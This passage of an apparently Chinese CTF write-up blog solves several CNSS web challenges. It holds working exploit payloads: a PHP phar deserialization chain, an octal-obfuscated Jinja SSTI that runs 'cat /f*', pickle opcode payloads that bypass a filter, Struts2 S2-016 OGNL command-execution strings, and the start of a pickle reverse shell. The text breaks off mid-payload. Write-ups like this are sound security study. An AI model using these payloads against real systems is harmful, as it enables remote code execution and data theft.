class="line">&lt;nav <span class="class"><span class="keyword">class</span>=&quot;<span class="title">navbar</span> <span class="title">navbar</span>-<span class="title">default</span>&quot; <span class="title">role</span>=&quot;<span class="title">navigation</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>-<span class="title">fluid</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">navbar</span>-<span class="title">header</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">navbar</span>-<span class="title">brand</span>&quot; <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot;&gt;首页&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">nav</span> <span class="title">navbar</span>-<span class="title">nav</span> <span class="title">navbra</span>-<span class="title">toggle</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">active</span>&quot;&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">file</span>.<span class="title">php</span>?<span class="title">file</span>=&quot;&gt;查看文件&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">upload_file</span>.<span class="title">php</span>&quot;&gt;上传文件&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">nav</span> <span class="title">navbar</span>-<span class="title">nav</span> <span class="title">navbar</span>-<span class="title">right</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot;&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">glyphicon</span> <span class="title">glyphicon</span>-<span class="title">user</span>&quot;&gt;&lt;/<span class="title">span</span>&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> (&#x27;<span class="title">hello</span>,&#x27;.$<span class="title">_SERVER</span>[&#x27;<span class="title">REMOTE_ADDR</span>&#x27;]);?&gt;&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">nav</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;!--<span class="title">flag</span> <span class="title">is</span> <span class="title">in</span> <span class="title">f1ag</span>.<span class="title">php</span>--&gt;</span></span><br></pre></td></tr></table></figure><p><code>index.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;base.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>不对啊，东西也不够啊，想起了<code>file.php</code>，得到最关键的信息<code>class.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span>.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CNSS</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shino</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shin0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;shin0 = <span class="string">&#x27;cnss&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_sayhello</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_sayhello</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&#x27;&lt;h1&gt;I know you are in a hurry, but don not rush yet.&lt;h1&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;shin0 = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;shin0.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CN55</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_get</span>(<span class="string">&#x27;key&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file_get</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$haha</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;key.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;haha[<span class="string">&#x27;hehe&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$func</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;&lt;h1&gt;hackerrrrrr!&lt;br&gt;join CNSS~&lt;h1&gt;&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;   <span class="comment">//Do you know &#x27;Php ARchive&#x27;?</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://picx.zhimg.com/80/v2-7cac117389557ba335fe0ee1073c4a01_1440w.png" alt="" /></p><p>首先注意到<code>file_get_contents</code>这个函数，让它作为出口，但是没有输出，使用到<code>CNSS</code>的析构函数(echo)，同时<code>Show</code>的<code>__toString()</code>方法触发<code>CN55</code>的<code>__invoke()</code>方法</p><p>本题不会触发<code>__wakeup()</code>，就不用进行绕过了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CNSS</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shino</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shin0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CN55</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$haha</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CNSS</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;haha[<span class="string">&#x27;hehe&#x27;</span>] = <span class="keyword">new</span> <span class="title class_">CN55</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;haha[<span class="string">&#x27;hehe&#x27;</span>]-&gt;params[<span class="string">&#x27;key&#x27;</span>] = <span class="string">&quot;f1ag.php&quot;</span>;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span> . <span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>修改为<code>phar.jpg</code>，这个题目坏在不给我们提供文件路径得自己计算<code>md5(phar.jpg)</code>，一开始我还以为没上传成功，就不管这题了<br />后面学弟说要自己算，开始还拿错网站了。。。<br /><code>url/file.php?file=phar://upload/628941e623f5a967093007bf39be805f.jpg</code></p><p><code>CNSS&#123;Y0u_Kn0w_PHP_v2ry_we1l!&#125;</code><br />考点<code>pop链构造+phar反序列化</code></p><h2 id="cnss娘の聊天室"><a class="markdownIt-Anchor" href="#cnss娘の聊天室"></a> 💻 CNSS娘の聊天室</h2><p><code>&#123;&#123;7*7&#125;&#125;，判断是SSTI</code>(默认jinja了，这个太常见了)<br />只把<code>字母</code>ban了，利用八进制绕过</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__bases__.__subclasses__()[<span class="number">133</span>].__init__.__globals__.popen(<span class="string">&#x27;cat /f*&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">.__class__ =&gt; [<span class="string">&quot;\137\137\143\154\141\163\163\137\137&quot;</span>]</span><br><span class="line">.__base__ =&gt; [<span class="string">&quot;\137\137\142\141\163\145\137\137&quot;</span>]</span><br><span class="line">.__subclasses__ =&gt; [<span class="string">&quot;\137\137\163\165\142\143\154\141\163\163\145\163\137\137&quot;</span>]</span><br><span class="line">.__init__ =&gt; [<span class="string">&quot;\137\137\151\156\151\164\137\137&quot;</span>]</span><br><span class="line">.__globals__ =&gt; [<span class="string">&quot;\137\137\147\154\157\142\141\154\163\137\137&quot;</span>]</span><br><span class="line">.popen =&gt; [<span class="string">&quot;\160\157\160\145\156&quot;</span>]</span><br><span class="line">cat /f* =&gt; <span class="string">&quot;\143\141\164\40\57\146\52&quot;</span></span><br><span class="line">.read =&gt; [<span class="string">&quot;\162\145\141\144&quot;</span>]</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;\137\137\143\154\141\163\163\137\137&#x27;</span>][<span class="string">&quot;\137\137\142\141\163\145\137\137&quot;</span>][<span class="string">&quot;\137\137\163\165\142\143\154\141\163\163\145\163\137\137&quot;</span>]()[<span class="number">133</span>][<span class="string">&quot;\137\137\151\156\151\164\137\137&quot;</span>][<span class="string">&quot;\137\137\147\154\157\142\141\154\163\137\137&quot;</span>][<span class="string">&quot;\160\157\160\145\156&quot;</span>](<span class="string">&quot;\143\141\164\40\57\146\52&quot;</span>)[<span class="string">&quot;\162\145\141\144&quot;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1:5000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span></span><br><span class="line">    res = requests.get(url=url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os._wrap_close&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p><code>CNSS&#123;y0u_Fxxking_ru1n3d_My_ch4tr00m!&#125;</code></p><p>考点<code>无字母八进制绕过SSTI</code></p><h2 id="cnss娘のflag商店"><a class="markdownIt-Anchor" href="#cnss娘のflag商店"></a> 🏪 CNSS娘のFlag商店</h2><p><code>main.py</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> buyInfo</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">flag = os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hi</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, money</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.money = money</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> self.name == other.name <span class="keyword">and</span> self.money == other.money</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    user = flask.request.args.get(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;View code in /code to buy flag.&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;R&#x27;</span> <span class="keyword">in</span> user.upper():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;臭要饭的别挡我财路&#x27;</span></span><br><span class="line"></span><br><span class="line">    user = pickle.loads(user.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(user.name, user.money)</span><br><span class="line">    <span class="built_in">print</span>(buyInfo.NAME,  buyInfo.MONEY)</span><br><span class="line">    <span class="keyword">if</span> user == Hi(buyInfo.NAME,  buyInfo.MONEY):</span><br><span class="line">        buyInfo.reset()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;CNSS娘最喜欢富哥啦，这是你要的flag <span class="subst">&#123;flag&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;臭要饭的别挡我财路&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/code&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">code</span>():</span><br><span class="line">    file = <span class="string">&#x27;code.zip&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> flask.send_file(file, mimetype=<span class="string">&#x27;application/zip&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><p><code>buyInfo.py</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">NAME = <span class="string">&quot;Rich&quot;</span></span><br><span class="line">MONEY = <span class="number">2000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reset</span>():</span><br><span class="line">    <span class="keyword">global</span> NAME, MONEY</span><br><span class="line">    NAME = <span class="string">&quot;Rich&quot;</span></span><br><span class="line">    MONEY = <span class="number">2000</span></span><br></pre></td></tr></table></figure><p>重点是不能出现<code>r R</code>，但又要是<code>Rich</code>，关注到<code>user = pickle.loads(user.encode('utf-8'))</code>，很明显的<code>pickle</code>反序列化，ban了<code>R指令</code>，<code>__reduce__</code>就无法使用了，类似于<code>PHP</code>中的<code>__wakeup</code>(触发反序列化就自动调用)<br />接下来，手搓<code>opcode</code><br /><a href="https://www.cnblogs.com/cioi/p/12464592.html">https://www.cnblogs.com/cioi/p/12464592.html</a><br /><a href="https://goodapple.top/archives/1069">https://goodapple.top/archives/1069</a><br /><a href="https://www.kinsomnia.cn/index.php/2023/12/11/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://www.kinsomnia.cn/index.php/2023/12/11/pickle反序列化/</a><br /><a href="https://tttang.com/archive/1782/">https://tttang.com/archive/1782/</a><br /><a href="https://xz.aliyun.com/t/7436">https://xz.aliyun.com/t/7436</a><br /><a href="http://ngc660.cn/2022/11/%E6%9C%80%E8%BF%91%E7%A2%B0%E5%88%B0%E7%9A%84-python-pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E6%80%BB%E7%BB%93/">http://ngc660.cn/2022/11/最近碰到的-python-pickle-反序列化小总结/</a><br />本地试验一下，同时也熟悉一下<code>c o i</code>三种操作码</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">十六进制编码绕过</span><br><span class="line">(S<span class="string">&#x27;\x52ich&#x27;</span></span><br><span class="line">I2000</span><br><span class="line">i__main__</span><br><span class="line">Hi</span><br><span class="line">.</span><br><span class="line">payload: (S<span class="string">&#x27;\x52ich&#x27;</span>%0aI2000%0ai__main__%0aHi%0a.</span><br><span class="line"></span><br><span class="line">unicode编码绕过</span><br><span class="line">(V\u0052ich</span><br><span class="line">I2000</span><br><span class="line">i__main__</span><br><span class="line">Hi</span><br><span class="line">.</span><br><span class="line">payload: (V\u0052ich%0aI2000%0ai__main__%0aHi%0a.</span><br><span class="line"></span><br><span class="line">或者c操作码从buyInfo全局变量引入进来，有点小复杂的感jio</span><br><span class="line">(i__main__</span><br><span class="line">Hi</span><br><span class="line">(dS<span class="string">&#x27;money&#x27;</span></span><br><span class="line">I2000</span><br><span class="line">sS<span class="string">&#x27;name&#x27;</span></span><br><span class="line">cbuyInfo</span><br><span class="line">NAME</span><br><span class="line">sb.</span><br><span class="line">payload: (i__main__%0aHi%0a(dS<span class="string">&#x27;money&#x27;</span>%0aI2000%<span class="number">0</span>asS<span class="string">&#x27;name&#x27;</span>%0acbuyInfo%0aNAME%<span class="number">0</span>asb.</span><br></pre></td></tr></table></figure><p><code>CNSS&#123;fl4g_0nly_f0r_r1ch_k1d5&#125;</code><br />考点<code>pickle反序列化R指令绕过</code></p><h2 id="tomcatcat~"><a class="markdownIt-Anchor" href="#tomcatcat~"></a> 😽 Tomcat?cat~</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python .\Struts2Scan.py -u http://152.136.11.155:10110/user.action</span><br><span class="line"></span><br><span class="line"> ____  _              _       ____    ____</span><br><span class="line">/ ___|| |_ _ __ _   _| |_ ___|___ \  / ___|  ___ __ _ _ __</span><br><span class="line">\___ \| __| <span class="string">&#x27;__| | | | __/ __| __) | \___ \ / __/ _` | &#x27;</span>_ \</span><br><span class="line"> ___) | |_| |  | |_| | |_\__ \/ __/   ___) | (_| (_| | | | |</span><br><span class="line">|____/ \__|_|   \__,_|\__|___/_____| |____/ \___\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">                                      Author By HatBoy</span><br><span class="line"></span><br><span class="line">[+] 正在扫描URL:http://152.136.11.155:10110/user.action</span><br><span class="line">[*] ----------------results------------------</span><br><span class="line">[*] http://152.136.11.155:10110/user.action 存在漏洞: S2-016</span><br></pre></td></tr></table></figure><p><code>payload</code>参考<a href="https://blog.csdn.net/qq_36241198/article/details/114937777">https://blog.csdn.net/qq_36241198/article/details/114937777</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">任意命令执行 <span class="built_in">env</span> 打印环境变量，存在fake flag</span><br><span class="line">redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.<span class="built_in">set</span>%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.<span class="built_in">exec</span>%28%27env%27%29.getInputStream%28%29%29%7D</span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span> / 没有找到flag，不是一般的网站的根目录</span><br><span class="line">redirect%3A%24%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%20%7B%22ls%22%2C%22/usr/local/tomcat/webapps/ROOT%22%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader%20(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.<span class="built_in">read</span>(%23e)%2C%23matt%3D%20%23context.get(<span class="string">&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;</span>)%2C%23matt.getWriter().println%20(%23e)%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%7D</span><br><span class="line"></span><br><span class="line">爆网站根目录 /usr/local/tomcat/webapps/ROOT/ </span><br><span class="line">redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D</span><br><span class="line"></span><br><span class="line">从根目录往上翻，<span class="built_in">cat</span>不动flaaaaaaag，笑嘻了，是个文件夹，/usr/local/tomcat/webapps/flaaaaaaag/flag.jsp</span><br><span class="line">redirect%3A%24%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%20%7B%22cat%22%2C%22/usr/local/tomcat/webapps/flaaaaaaag/flag.jsp%22%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader%20(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.<span class="built_in">read</span>(%23e)%2C%23matt%3D%20%23context.get(<span class="string">&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;</span>)%2C%23matt.getWriter().println%20(%23e)%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%7D </span><br></pre></td></tr></table></figure><p><code>CNSS&#123;t0mcat_!s_4_cute_cat_m1a0!&#125;</code><br />话说它的<code>fake flag: FLAG=flag&#123;7r0m_jwt_t0_struts2&#125;</code>，也让我一度怀疑，这里有<code>jwt</code>吗？乱蛊惑人</p><p>考点<code>struts2漏洞</code></p><h2 id="newsql"><a class="markdownIt-Anchor" href="#newsql"></a> 💽 newsql()</h2><p><code>MySQL8</code>新特性注入，有点事，然后<code>SQL注入</code>又不是很想看，后续无……</p><h2 id="cnss娘の自助flag商店"><a class="markdownIt-Anchor" href="#cnss娘の自助flag商店"></a> 🔪 CNSS娘の自助Flag商店</h2><p>这次不返回<code>flag</code>了，没有回显，<code>flag is in /flag.txt</code>，考虑反弹<code>shell</code>(可以不装富哥了这次，拿了flag就走)<br />注意编码<code>&amp;</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">(cos</span><br><span class="line">system</span><br><span class="line">S<span 